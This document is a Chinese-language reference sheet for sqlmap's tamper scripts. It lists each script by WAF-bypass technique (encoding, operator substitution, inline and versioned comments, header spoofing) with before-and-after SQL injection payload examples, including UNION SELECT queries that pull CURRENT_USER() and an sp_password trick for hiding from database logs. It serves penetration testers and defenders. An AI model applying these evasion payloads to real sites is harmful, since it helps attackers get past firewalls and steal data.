
# 0x00 sqlmap目录下的temper目录，目录里的脚本有不同的功能老帮助我们使用sqlmap进行高级的sql注入。
    如：绕过waf

	sqlmap -u http://192.168.1.3:8008/onews.asp?id=45 --tamper "randomcase.py"


# 0x01 编码绕过
	apostrophemask.py             用utf8代替引号					
								  '  ===>>>  %EF%BC%87
	apostrophenullencode.py 	  对 ' 进行url编码 					
							 	  ' -> %00%27
	appendnullbyte.py 			  末尾追加空字节字符					
								  1 and 1=1%00
	base64encode.py 			  对payload进行base64编码
	chardoubleencode.py 		  双重URL编码给定有效负载中的所有字符（不处理已编码）
								  SELECT FIELD FROM%20TABLE ===>>> %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545
	charencode.py 				  URL编码给定有效负载中的所有字符（未处理已编码）
								  SELECT  ===>>>  %53%45%4C%45%43%54
	charunicodeencode.py 		  Unicode-URL编码给定有效负载中的所有字符（未处理已编码）
								  SELECT ===>>> %u0053%u0045%u004C%u0045%u0043%u0054
	charunicodeescape.py 		  Unicode-转义给定有效负载中的非编码字符（不处理已编码）
								  SELECT ===>>> \u0053\u0045\u004C\u0045\u0043\u0054
	htmlencode.py 				  HTML编码（使用代码点）所有非字母数字字符
								  1' AND SLEEP(5)#  ===>>>  1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;
	overlongutf8more.py 		  将给定有效负载中的所有字符转换为超长UTF8（未处理已编码）
								  SELECT  ===>>>  %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94
	overlongutf8.py 			  将给定有效负载中的所有（非孤立）字符转换为过长的UTF8（未处理已编码）
								  ' - >％C0％A7


# 0x02 替换绕过
	between.py 					  用'NOT BETWEEN 0 AND＃'替换大于运算符（'>'）
								  用'BETWEEN＃AND＃'替换运算符（'='）
	bluecoat.py 			 	  用有效的随机空白字符替换SQL语句后的空格字符。 然后用运算符LIKE替换字符'='
								  SELECT%09id FROM%09users WHERE%09id LIKE 1
	commalesslimit.py 			  用'LIMITN OFFSET M'代替'LIMIT M，N'替换（MySQL）
	commalessmid.py 			  用“MID（A FROM B FOR C）”对应代替“MID（A，B，C）”之类的（MySQL）
	concat2concatws.py 			  用'CONCAT_WS（MID（CHAR（0），0,0），A，B）替换 CONCAT（A，B）
	equaltolike.py 				  用“LIKE”替换所有出现的'='
	greatest.py 				  用'GREATEST'替换大于运算符（'>'）
								  1 AND A > B  ===>>>  1 AND GREATEST(A,B+1)=A 
	least.py 					  用'LEAST'替换大于运算符（'>'）
								  1 AND A > B  ===>>>  1 AND LEAST(A,B+1)=B+1
	lowercase.py 				  用小写值替换每个关键字字符
								  SELECT  ===>>> select
	ifnull2casewhenisnull.py  	  将'IFNULL（A，B）'替换为'CASE WHEN ISNULL（A）然后（B）ELSE（A）END'
								  IFNULL(1, 2)  ===>>>  CASE WHEN ISNULL(1) THEN (2) ELSE (1) END
	ifnull2ifisnull.py  		  将'IFNULL（A，B）'替换成'IF（ISNULL（A），B，A）'
						     	  IFNULL(1, 2)  ===>>>  IF(ISNULL(1),2,1)
	plus2concat.py 				  用（MsSQL）函数CONCAT()替换加运算符'+'
								  SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL  ===>>>  SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL
	plus2fnconcat.py 			  用（MsSQL）ODBC函数{fn CONCAT（）}替换加运算符（'+'）
								  SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL  ===>>>  SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL
	randomcase.py 				  用随机大小写值替换每个关键字字符
								  SELECT  ===>>>  SEleCt
	space2plus.py 				  用 '+' 替换空格
								  SELECT id FROM users  ===>>>  SELECT+id+FROM+users
	space2randomblank.py 		  用一组随机的有效的替换字符替换空格
								  SELECT id FROM users  ===>>>  SELECT%0Did%0CFROM%0Ausers
	substring2leftright.py 		  (PostgreSQL)用left()和right()替换substring()
								  SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)  ===>>>  LEFT((SELECT usename FROM pg_user)::text,1)
								  SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1  ===>>>  LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)
	symboliclogical.py 			  用符号（&&和||）替换AND和OR逻辑运算符
	unionalltounion.py 			  用UNION SELECT替换UNION ALL SELECT
	unmagicquotes.py 			  用多字节组合％BF％27替换引号字符（'）以及最后的通用注释
								  1' AND 1=1  ===>>>  1%bf%27-- -
	uppercase.py 				  用大写值替换每个关键字字符
								  select  - > SELECT


# 0x03 注释绕过
	commentbeforeparentheses.py   在括号前添加（内联）注释
								 （  ===>>> / ** /（
	halfversionedmorekeywords.py  在每个关键字之前添加（MySQL）版本化注释
								  value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa  ===>>>   value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa
	hex2char.py 				  用等效的CONCAT(CHAR()，...)替换每个（MySQL）0x<hex>编码的字符串
								  SELECT 0xdeadbeef  ===>>>  SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239)) 
	informationschemacomment.py   在所有出现的（MySQL）“information_schema”标识符的末尾添加内联注释（/ ** /）
				   				  SELECT table_name FROM INFORMATION_SCHEMA.TABLES  ===>>>  SELECT table_name FROM INFORMATION_SCHEMA/ ** /.TABLES
	modsecurityversioned.py 	  包含（MySQL）版本化评论的完整查询
								  1 AND 2>1--  ===>>>  1 /*!30963AND 2>1*/--
	modsecurityzeroversioned.py   包含（MySQL）零版本注释的完整查询
								  1 AND 2>1--  ===>>>  1 /*!00000AND 2>1*/--
	randomcomments.py 			  在SQL关键字中添加随机内联注释
	 							  SELECT  ===>>>  S / ** / E / ** / LECT）
	space2comment.py 			  用注释'/ ** /'替换空格字符（' '）
	space2dash.py 				  将空格字符（' '）替换为短划线注释（'-'），后跟随机字符串和新行（'\n'）
	 							  1 AND 9227=9227  ===>>>  1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227
	space2hash.py 				  将空格字符（' '）替换（MySQL）＃号注释（'#'）实例，后跟随机字符串和新行（'\n'）
								  1 AND 9227=9227  ===>>>  1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227
	space2morecomment.py 		  用注释'/ ** _ ** /'替换（MySQL）空格字符（' '）
	space2morehash.py 			  将空格字符（''）替换（MySQL）注释字符（'#'）实例，后跟随机字符串和新行（'\ n'）
	space2mssqlblank.py 		  用一组有效的替换字符中的随机空白字符替换（MsSQL）空格字符（''）
								  SELECT id FROM users  ===>>>  SELECT%0Did%0DFROM%04users
	space2mssqlhash.py 			  用注释字符（'#'）替换空格字符（''）后跟一个新行（'\n'）
								  1 AND 9227=9227  ===>>>  1%23%0AAND%23%0A9227=9227
	space2mysqlblank.py  		  用一组有效的替换字符中的随机空白字符替换（MySQL）空格字符（''）
								  SELECT id FROM users  ===>>>  SELECT%A0id%0CFROM%0Dusers
	space2mysqldash.py 			  将空格字符（''）替换为短划线注释（'-'）后跟新行（'\n'） 
								  1 AND 9227=9227  ===>>>  1--%0AAND--%0A9227=9227
	versionedkeywords.py 		  用（MySQL）版本化注释包含每个非函数关键字
								  1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# ===>>>  1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#
	versionedmorekeywords.py 	  用（MySQL）版本化注释包含每个关键字
								  1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#  ===>>>  1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#


# 0x04 转义绕过
	escapequotes.py 			  斜杠转义单引号和双引号
							      '  ===>>>  \'


# 0x05 添加绕过
	multiplespaces.py 			  在SQL关键字周围添加多个空格（''）
	percentage.py 				  在每个字符前面添加一个百分号（'％'）
								  SELECT  - >％S％E％L％E％C％T）
	sp_password.py 				  将（MsSQL）函数"sp_password"附加到有效负载的末尾，
								  以便从DBMS日志中自动进行模糊处理
								  1 AND 9227=9227--  ===>>>  1 AND 9227=9227-- sp_password


# 0x06 其他绕过
	luanginx.py 				  LUA-Nginx WAF绕道（例如Cloudflare）
	varnish.py 					  附加HTTP标头“X-originating-IP”以绕过Varnish Firewall
								  headers["X-originating-IP"] = "127.0.0.1"
	xforwardedfor.py 			  附加一个假的HTTP标头'X-Forwarded-For'
								  headers = kwargs.get("headers", {})
	    						  headers["X-Forwarded-For"] = randomIP()
	    						  headers["X-Client-Ip"] = randomIP()
	    						  headers["X-Real-Ip"] = randomIP()